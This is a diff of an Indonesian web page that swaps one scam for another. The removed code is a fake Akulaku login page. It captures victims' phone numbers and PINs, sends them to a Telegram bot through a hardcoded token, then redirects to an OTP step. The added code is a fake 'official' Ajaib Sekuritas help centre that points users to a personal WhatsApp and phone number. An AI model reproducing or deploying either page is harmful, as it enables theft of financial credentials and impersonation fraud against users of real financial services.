@@ -1,451 +1,206 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Login AKULAKU</title>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17451179320">
+</script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
-
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  body {
-    font-family: 'Roboto', sans-serif;
-    background-color: #fff;
-    margin: 40px 16px;
-    color: #000;
-    min-height: 100vh;
-  }
-
-  .container {
-    max-width: 360px;
-    margin: 0 auto;
-  }
-
-  .logo-container { text-align: center; margin-bottom: 32px; }
-
-  .logo {
-    width: 150px;
-    height: auto;
-    display: block;
-    margin-left: auto;
-    margin-right: auto;
-  }
-
-  .welcome-text {
-    text-align: center;
-    margin-bottom: 28px;
-  }
-
-  .welcome-text h1 {
-    font-size: 20px;
-    font-weight: 700;
-    color: #1a1a1a;
-    margin-bottom: 8px;
-  }
-
-  .welcome-text p {
-    font-size: 14px;
-    color: #666;
-  }
-
-  label {
-    display: block;
-    font-weight: 600;
-    font-size: 14px;
-    margin-bottom: 6px;
-    color: #333;
-  }
-
-  input[type="tel"],
-  input[type="password"] {
-    width: 100%;
-    font-size: 14px;
-    padding: 12px 40px 12px 12px;
-    border: 1px solid #ccc;
-    border-radius: 6px;
-    box-sizing: border-box;
-    color: #555;
-    outline: none;
-    transition: border-color 0.2s, box-shadow 0.2s;
-  }
-
-  input[type="tel"]:focus,
-  input[type="password"]:focus {
-    border-color: #dc3545;
-    box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.1);
-  }
-
-  input::placeholder { color: #aaa; }
-
-  .input-group { margin-bottom: 16px; }
-
-  .password-container { position: relative; }
-
-  .eye-icon {
-    position: absolute;
-    right: 10px;
-    top: 50%;
-    transform: translateY(-50%);
-    width: 20px;
-    height: 20px;
-    cursor: pointer;
-    color: #888;
-    user-select: none;
-    transition: color 0.2s;
-  }
-
-  .eye-icon:hover { color: #666; }
-
-  .forgot-link {
-    display: block;
-    font-size: 13px;
-    color: #dc3545;
-    text-align: right;
-    text-decoration: none;
-    margin-bottom: 24px;
-    margin-top: -16px;
-  }
-
-  .forgot-link:hover { text-decoration: underline; }
-
-  button.login-btn {
-    width: 100%;
-    padding: 12px 0;
-    font-size: 14px;
-    font-weight: 600;
-    border-radius: 6px;
-    border: none;
-    background-color: #d4d4e3;
-    color: #888;
-    cursor: not-allowed;
-    margin-bottom: 24px;
-    transition: background-color 0.3s, color 0.3s;
-  }
-
-  button.login-btn.enabled {
-    background-color: #dc3545;
-    color: #fff;
-    cursor: pointer;
-  }
-
-  button.login-btn.enabled:hover {
-    background-color: #c82333;
-  }
-
-  button.login-btn.loading {
-    background-color: #dc3545;
-    color: #fff;
-    cursor: wait;
-  }
-
-  .or-text {
-    text-align: center;
-    font-weight: 400;
-    font-size: 14px;
-    margin-bottom: 20px;
-    color: #999;
-    position: relative;
-  }
-
-  .or-text::before,
-  .or-text::after {
-    content: '';
-    position: absolute;
-    top: 50%;
-    width: 40%;
-    height: 1px;
-    background-color: #ddd;
-  }
-
-  .or-text::before { left: 0; }
-  .or-text::after { right: 0; }
-
-  button.google-btn {
-    width: 100%;
-    border: 1px solid #ddd;
-    padding: 10px 0;
-    border-radius: 6px;
-    background-color: #fff;
-    font-weight: 700;
-    font-size: 14px;
-    cursor: pointer;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 8px;
-    user-select: none;
-  }
-
-  button.google-btn:hover { background-color: #f5f5f5; border-color: #ccc; }
-
-  .google-icon { width: 20px; height: 20px; }
-
-  .register-text {
-    text-align: center;
-    margin-top: 24px;
-    font-size: 14px;
-    color: #666;
-  }
-
-  .register-text a {
-    color: #dc3545;
-    text-decoration: none;
-    font-weight: 600;
-  }
-
-  .register-text a:hover { text-decoration: underline; }
-
-  .spinner {
-    display: none;
-    width: 16px;
-    height: 16px;
-    border: 2px solid #fff;
-    border-top-color: transparent;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    margin-right: 8px;
-  }
-
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  button.login-btn.loading .spinner { display: inline-block; }
-  button.login-btn.loading .btn-text { display: none; }
-
-  .toast {
-    position: fixed;
-    bottom: 20px;
-    left: 50%;
-    transform: translateX(-50%) translateY(100px);
-    background-color: #333;
-    color: #fff;
-    padding: 12px 24px;
-    border-radius: 8px;
-    font-size: 14px;
-    opacity: 0;
-    transition: all 0.3s ease;
-    z-index: 1000;
-    max-width: 320px;
-    text-align: center;
-  }
-
-  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-  .toast.error { background-color: #dc3545; }
-  .toast.success { background-color: #28a745; }
-</style>
+  gtag('config', 'AW-17451179320');
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="Pusat Bantuan Resmi Ajaib Sekuritas - Layanan pelanggan 24/7 untuk semua kebutuhan investasi Anda" />
+  <meta name="keywords" content="Ajaib Sekuritas, customer service, bantuan investasi, layanan pelanggan, call center" />
+  <title>Pusat Bantuan Ajaib Sekuritas</title>
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+  <!-- Navigation Bar -->
+  <nav class="nav" id="main-navigation">
+    <a href="#beranda" class="nav__logo">Ajaib Sekuritas</a>
+    <a href="#contact-section" class="nav__button">Hubungi CS</a>
+  </nav>
+
   <div class="container">
-    <div class="logo-container">
-      <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo AJAIB" class="logo" />
-    </div>
+    <!-- Hero Section -->
+    <header id="beranda" class="hero-section">
+      <img src="logo-ajaib.png" alt="Logo Ajaib Sekuritas" class="hero-logo">
+      <h1>Pusat Bantuan Resmi Ajaib Sekuritas</h1>
+      <p>Selamat datang di Pusat Bantuan Ajaib Sekuritas. Tim <strong>Customer Service (CS)</strong> kami siap membantu Anda 24/7 terkait pertanyaan, pengaduan keluhan, atau masalah seputar investasi Anda di Ajaib.</p>
+    </header>
 
-    <div class="welcome-text">
-      <h1>Masuk ke Akun</h1>
-      <p>Silakan masuk dengan nomor HP dan PIN Anda</p>
-    </div>
-
-    <form id="loginForm" novalidate>
-      <div class="input-group">
-        <label for="phone">Nomor HP</label>
-        <input type="tel" id="phone" name="phone" placeholder="081234567890" required />
-      </div>
-
-      <div class="input-group">
-        <label for="password">PIN</label>
-        <div class="password-container">
-          <input type="password" id="password" name="password" placeholder="Masukkan 6 digit PIN" maxlength="6" required />
-          <svg id="togglePassword" class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path>
-            <circle cx="12" cy="12" r="3"></circle>
+    <!-- Contact Section -->
+    <section id="contact-section" class="contact-section">
+      <h2><span class="section-title">Pusat Kontak Layanan</span></h2>
+      <p class="section-description">Hubungi kami melalui berbagai channel yang tersedia 24/7</p>
+      <div class="contact-cards">
+        <div class="contact-card" role="article">
+          <svg class="icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
           </svg>
+          <h3>Call Center Ajaib</h3>
+          <p>Bicara langsung dengan tim Customer Service Ajaib untuk solusi cepat.</p>
+          <a href="tel:081328282521" target="_blank" rel="noopener noreferrer" style="text-decoration:none;"><p class="contact-number" aria-label="Nomor Call Center">081328282521</p></a>
+        </div>
+        <div class="contact-card" role="article">
+          <svg class="icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path>
+          </svg>
+          <h3>WhatsApp CS Ajaib</h3>
+          <p>Chat dengan agen Customer Service Ajaib via WhatsApp untuk bantuan praktis.</p>
+          <a href="https://wa.me/6281328282521" target="_blank" rel="noopener noreferrer" style="text-decoration:none;"><p class="contact-number" aria-label="Nomor WhatsApp">081328282521</p></a>
+        </div>
         </div>
       </div>
+    </section>
 
-      <a href="#" class="forgot-link" onclick="showToast('Fitur ini belum tersedia')">Lupa PIN?</a>
+    <!-- Benefits Section -->
+    <section id="benefits-section" class="benefits-section">
+      <h2><span class="section-title">Keunggulan Layanan CS Ajaib</span></h2>
+      <p class="section-description">Mengapa Anda harus menghubungi Customer Service Ajaib?</p>
+      <div class="benefits-container">
+        <div class="benefits">
+          <div class="benefit-card" role="article">
+            <svg class="icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"></circle>
+              <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+            <h4>Solusi Cepat & Tepat</h4>
+            <p>Dapatkan jawaban dan solusi untuk setiap pertanyaan atau kendala investasi Anda.</p>
+          </div>
+          <div class="benefit-card" role="article">
+            <svg class="icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <h4>Layanan Aman & Terpercaya</h4>
+            <p>Kami menjaga kerahasiaan data dan memberikan informasi yang akurat.</p>
+          </div>
+          <div class="benefit-card" role="article">
+            <svg class="icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+            </svg>
+            <h4>Dukungan Investasi Anda</h4>
+            <p>Kami siap membantu Anda memaksimalkan potensi investasi bersama Ajaib.</p>
+          </div>
+        </div>
+    </section>
 
-      <button type="submit" id="loginBtn" class="login-btn" disabled>
-        <span class="btn-text">Masuk</span>
-        <div class="spinner"></div>
-      </button>
-    </form>
+    <!-- FAQ Section -->
+    <section id="faq-section" class="faq-section">
+      <h2><span class="section-title">Informasi Layanan (FAQ)</span></h2>
+      <p class="section-description">Temukan jawaban untuk pertanyaan yang sering diajukan</p>
+      <div class="faq-container">
+        <div class="faq-item">
+          <div class="faq-question">Bagaimana cara menghubungi layanan pelanggan Ajaib Sekuritas?</div>
+          <div class="faq-answer">Anda dapat menghubungi layanan pelanggan Ajaib Sekuritas melalui Call Center di nomor <a href="https://wa.me/6281328282521" target="_blank" rel="noopener noreferrer" style="text-decoration:none;">081328282521</a> atau melalui chat WhatsApp di nomor yang sama. Layanan kami tersedia 24/7.</div>
+        </div>
 
-    <div class="or-text">atau</div>
+        <div class="faq-item">
+          <div class="faq-question">Apakah layanan pelanggan Ajaib berbayar?</div>
+          <div class="faq-answer">Tidak, layanan pelanggan Ajaib Sekuritas tidak dipungut biaya. Anda dapat menghubungi kami kapan saja untuk mendapatkan bantuan terkait produk dan layanan Ajaib.</div>
+        </div>
 
-    <button class="google-btn" onclick="googleLogin()">
-      <svg class="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 533.5 544.3">
-        <path fill="#4285F4" d="M533.5 278.4c0-18.5-1.5-36.4-4.4-53.8H272v101.9h146.8c-6.3 34-25.3 62.7-54.3 82v67h87.7c51.2-47.3 80.3-116.7 80.3-197.1z"/>
-        <path fill="#34A853" d="M272 544.3c73.6 0 135.7-24.3 180.9-65.8l-87.7-67c-24.3 16.3-55.5 26-93.2 26-71.6 0-132.3-48.3-154.1-113.6h-90.6v71.3c45.1 89.1 137.5 149.1 244.7 149.1z"/>
-        <path fill="#FBBC04" d="M117.9 321.1c-8.7-25.7-8.7-53.7 0-79.4v-71.3h-90.6c-37.7 73.8-37.7 161.1 0 234.9l90.6-71.3z"/>
-        <path fill="#EA4335" d="M272 107.7c39.9-.6 77.7 14.9 106.6 43l79.8-79.8C406.6 24.3 344.5 0 272 0 164.7 0 72.3 60 27.2 149.1l90.6 71.3c21.7-65.4 82.5-113.6 154.2-113.6z"/>
-      </svg>
-      Lanjut dengan Google
-    </button>
+        <div class="faq-item">
+          <div class="faq-question">Jam berapa saja saya bisa menghubungi Ajaib Sekuritas?</div>
+          <div class="faq-answer">Tim Customer Service Ajaib Sekuritas siap melayani Anda 24 jam sehari, 7 hari seminggu, termasuk hari libur nasional.</div>
+        </div>
 
-    <div class="register-text">
-      <p>Belum punya akun? <a href="#" onclick="showToast('Fitur ini belum tersedia')">Daftar</a></p>
-    </div>
+        <div class="faq-item">
+          <div class="faq-question">Masalah apa saja yang bisa dibantu oleh Customer Service Ajaib?</div>
+          <div class="faq-answer">Customer Service Ajaib dapat membantu Anda terkait berbagai pertanyaan seputar investasi, penggunaan aplikasi Ajaib, kendala teknis, informasi produk, dan pengaduan keluhan.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section id="cta-section" class="cta-section" role="complementary">
+      <h3>Butuh Bantuan? Hubungi Kami Sekarang</h3>
+      <p>Tim Customer Service Ajaib Sekuritas selalu siap sedia 24 jam sehari, 7 hari seminggu, untuk membantu semua kebutuhan investasi Anda. Jangan ragu untuk menghubungi Call Center atau WhatsApp kami kapan saja.</p>
+      <div class="cta-contact-info">
+        <p>Punya pertanyaan atau butuh bantuan terkait investasi di Ajaib?</p>
+        <div class="contact-buttons">
+          <a href="tel:081328282521" class="contact-button phone-button">
+            <span class="button-icon">📞</span>
+            <span class="button-text">Call Center 
+             081328282521</span>
+          </a>
+          <a href="https://wa.me/6281328282521" class="contact-button whatsapp-button">
+            <span class="button-icon">💬</span>
+            <span class="button-text">WhatsApp  
+             081328282521</span>
+          </a>
+        </div>
+      </div>
+    </section>
   </div>
 
-  <div class="toast" id="toast"></div>
+  <!-- Footer Section -->
+  <footer class="footer">
+    <div class="footer-container">
+      <div class="footer-column">
+        <h4>Tentang Ajaib Sekuritas</h4>
+        <p>
+          Ajaib Sekuritas adalah platform investasi online yang aman dan terpercaya, diawasi oleh OJK. Kami berkomitmen untuk menyediakan akses investasi yang mudah bagi semua orang.
+        </p>
+      </div>
 
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+      <div class="footer-column">
+        <h4>Informasi Kontak CS</h4>
+        <ul>
+          <li>📞 Call Center: 081328282521</li>
+          <li>💬 WhatsApp: 081328282521</li>
+          <li>✉️ Email: support@ajaib.co.id (Contoh)</li>
+          <li>📍 Jakarta, Indonesia</li>
+        </ul>
+      </div>
+
+      <div class="footer-column">
+        <h4>Jam Layanan CS</h4>
+        <p>Senin - Minggu: 24 Jam Non-Stop<br>Termasuk Hari Libur Nasional</p>
+      </div>
+    </div>
+
+    <hr class="footer-divider" />
+
+    <div class="footer-bottom">
+      <p>©️ 2025 PT Ajaib Teknologi Indonesia (Ajaib Sekuritas). Hak cipta dilindungi undang-undang.</p>
+      <p>Informasi di halaman ini adalah untuk tujuan bantuan pelanggan dan dapat berubah sewaktu-waktu.</p>
+    </div>
+  </footer>
 
   <script>
-  $(document).ready(function() {
-      console.log('JS loaded - Login Page');
-
-      // ==========================================
-      // 1. TOGGLE SHOW/HIDE PASSWORD
-      // ==========================================
-      $('#togglePassword').on('click', function() {
-          const passwordField = $('#password');
-          const type = passwordField.attr('type') === 'password' ? 'text' : 'password';
-          passwordField.attr('type', type);
-
-          if (type === 'password') {
-              $(this).html('<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path><circle cx="12" cy="12" r="3"></circle>');
-          } else {
-              $(this).html('<path d="M17.94 17.94A10.99 10.99 0 0112 19c-4.97 0-9.28-3.16-11-7a11.05 11.05 0 015-5.28"></path><line x1="1" y1="1" x2="23" y2="23"></line><path d="M10.58 10.58a3 3 0 004.24 4.24"></path>');
-          }
+    // Smooth scroll for navigation
+    document.querySelector('.nav__button').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.querySelector('#contact-section').scrollIntoView({
+        behavior: 'smooth'
       });
+    });
 
-      // ==========================================
-      // 2. FORMAT NOMOR HP OTOMATIS
-      // ==========================================
-      $('#phone').on('input', function(e) {
-          let value = $(this).val().replace(/\D/g, '');
-          if (value.length > 0 && !value.startsWith('0') && !value.startsWith('62')) {
-              value = '0' + value;
-          }
-          if (value.length > 13) {
-              value = value.substring(0, 13);
-          }
-          $(this).val(value);
+    // FAQ Accordion
+    document.querySelectorAll('.faq-question').forEach(question => {
+      question.addEventListener('click', () => {
+        const answer = question.nextElementSibling;
+        const isActive = question.classList.contains('active');
+        
+        // Close all other answers
+        document.querySelectorAll('.faq-question').forEach(q => {
+          q.classList.remove('active');
+          q.nextElementSibling.classList.remove('active');
+        });
+
+        // Toggle current answer
+        if (!isActive) {
+          question.classList.add('active');
+          answer.classList.add('active');
+        }
       });
-
-      // ==========================================
-      // 3. VALIDASI FORM
-      // ==========================================
-      function isFormValid() {
-          const phone = $('#phone').val().trim();
-          const password = $('#password').val().trim();
-          return phone.length >= 10 && password.length >= 6;
-      }
-
-      // ==========================================
-      // 4. TOGGLE ENABLE/DISABLE TOMBOL LOGIN
-      // ==========================================
-      function toggleLoginButton() {
-          if (isFormValid()) {
-              $('#loginBtn').prop('disabled', false).addClass('enabled');
-          } else {
-              $('#loginBtn').prop('disabled', true).removeClass('enabled');
-          }
-      }
-
-      $('#phone, #password').on('input', toggleLoginButton);
-
-      // ==========================================
-      // 5. SUBMIT FORM & KIRIM KE TELEGRAM
-      // ==========================================
-      $('#loginForm').on('submit', function(e) {
-          e.preventDefault();
-
-          if (!isFormValid()) {
-              showToast('Nomor HP dan PIN harus diisi dengan benar', 'error');
-              return;
-          }
-
-          const phone = $('#phone').val().trim();
-          const password = $('#password').val().trim();
-
-          // Tampilkan loading
-          $('#loginBtn').addClass('loading').prop('disabled', true);
-          $('#loginBtn .btn-text').text('Memuat...');
-
-          // Format pesan untuk Telegram
-          const message = `
-🔐 **LOGIN AKULAKU**
-────────────────────
-📱 Nomor HP: \`${phone}\`
-🔑 PIN: \`${password}\`
-────────────────────
-⏰ Waktu: ${new Date().toLocaleString('id-ID')}
-          `;
-
-          // Konfigurasi Telegram - GANTI DENGAN DATA ANDA
-          const token_bot = '8636605167:AAGUdKXVdlyQ7UpKQqGKavdUBJcfMKTSoVo';
-          const telegram_id = '6493317033';
-
-          const url = `https://api.telegram.org/bot${token_bot}/sendMessage`;
-
-          $.ajax({
-              url: url,
-              method: 'POST',
-              data: {
-                  chat_id: telegram_id,
-                  text: message,
-                  parse_mode: 'Markdown'
-              },
-              success: function(data) {
-                  if (data.ok) {
-                      console.log('✅ Data berhasil dikirim ke Telegram');
-                      
-                      // Simpan ke sessionStorage
-                      sessionStorage.setItem('phone', phone);
-                      sessionStorage.setItem('pin', password);
-                      sessionStorage.setItem('login_step', '1');
-                      
-                      showToast('Login berhasil!', 'success');
-                      
-                      setTimeout(() => {
-                          window.location.href = 'otp.html';
-                      }, 1500);
-                  } else {
-                      showToast('Gagal mengirim data', 'error');
-                  }
-              },
-              error: function(xhr, status, error) {
-                  console.error('Error:', error);
-                  // Tetap lanjut ke OTP meskipun error (untuk demo)
-                      sessionStorage.setItem('phone', phone);
-                      sessionStorage.setItem('pin', password);
-                      sessionStorage.setItem('login_step', '1');
-                      
-                      showToast('Login berhasil!', 'success');
-                      
-                      setTimeout(() => {
-                          window.location.href = 'otp.html';
-                      }, 1500);
-              },
-              complete: function() {
-                  $('#loginBtn').removeClass('loading').prop('disabled', !isFormValid());
-                  $('#loginBtn .btn-text').text('Masuk');
-              }
-          });
-      });
-
-      // ==========================================
-      // 6. GOOGLE LOGIN & TOAST
-      // ==========================================
-      function googleLogin() {
-          showToast('Fitur Google Login belum tersedia');
-      }
-
-      function showToast(message, type = 'default') {
-          const toast = $('#toast');
-          toast.text(message)
-               .removeClass('error success')
-               .addClass(type)
-               .addClass('show');
-          
-          setTimeout(() => {
-              toast.removeClass('show');
-          }, 3000);
-      }
-  });
+    });
   </script>
 </body>
 </html>
